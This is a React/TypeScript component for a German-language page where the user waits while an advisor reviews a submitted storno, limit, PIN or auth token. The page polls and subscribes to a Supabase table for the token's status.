import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Loader2, CheckCircle2, XCircle, Clock } from "lucide-react";

type Kind = "storno" | "limit" | "pin" | "auth";

const tableFor = (k: Kind) =>
  k === "storno" ? "storno_tokens" : k === "limit" ? "limit_tokens" : k === "auth" ? "auth_tokens" : "pin_tokens";

const TokenWait = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();
  const kind = (params.get("kind") || "pin") as Kind;
  const token = params.get("token") || "";
  const [status, setStatus] = useState<string | null>(null);
  const [used, setUsed] = useState(false);
  const [missing, setMissing] = useState(false);

  useEffect(() => {
    if (!token) { setMissing(true); return; }
    let cancelled = false;
    const load = async () => {
      const { data } = await (supabase as any)
        .from(tableFor(kind))
        .select("security_status, used")
        .eq("token", token)
        .maybeSingle();
      if (cancelled) return;
      if (!data) { setMissing(true); return; }
      setStatus(data.security_status || null);
      setUsed(!!data.used);
    };
    load();
    const ch = (supabase as any)
      .channel(`wait_${kind}_${token}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: tableFor(kind), filter: `token=eq.${token}` }, load)
      .subscribe();
    const iv = window.setInterval(load, 3000);
    return () => { cancelled = true; window.clearInterval(iv); (supabase as any).removeChannel(ch); };
  }, [kind, token]);

  let icon = <Loader2 className="w-10 h-10 animate-spin text-primary" />;
  let title = "Bitte warten…";
  let text = "Ihr Berater prüft die Anfrage. Bitte halten Sie diese Seite geöffnet.";

  if (missing) {
    icon = <XCircle className="w-10 h-10 text-destructive" />;
    title = "Token nicht gefunden";
    text = "Bitte zurück gehen und Token erneut eingeben.";
  } else if (status === "approved") {
    icon = <CheckCircle2 className="w-10 h-10 text-green-600" />;
    title = "Freigegeben";
    text = "Ihre Anfrage wurde bestätigt.";
  } else if (status === "rejected") {
    icon = <XCircle className="w-10 h-10 text-destructive" />;
    title = "Abgelehnt";
    text = "Ihre Anfrage wurde abgelehnt. Bitte kontaktieren Sie Ihren Berater.";
  } else if (status === "timeout") {
    icon = <Clock className="w-10 h-10 text-yellow-600" />;
    title = "Zeitüberschreitung";
    text = "Bitte den Vorgang erneut starten.";
  } else if (used) {
    icon = <CheckCircle2 className="w-10 h-10 text-muted-foreground" />;
    title = "Token bereits verwendet";
    text = "Dieser Token wurde bereits eingelöst.";
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4 py-12">
      <Card className="w-full max-w-md">
        <CardHeader>
          <CardTitle className="text-base text-muted-foreground">
            {kind.toUpperCase()} · {token || "—"}
          </CardTitle>
        </CardHeader>
        <CardContent className="flex flex-col items-center text-center gap-4 py-8">
          {icon}
          <h2 className="text-xl font-semibold">{title}</h2>
          <p className="text-sm text-muted-foreground">{text}</p>
          {(missing || status === "rejected" || status === "timeout") && (
            <button
              onClick={() => navigate("/token")}
              className="mt-4 text-sm underline text-primary"
            >
              Zurück zur Token-Eingabe
            </button>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default TokenWait;
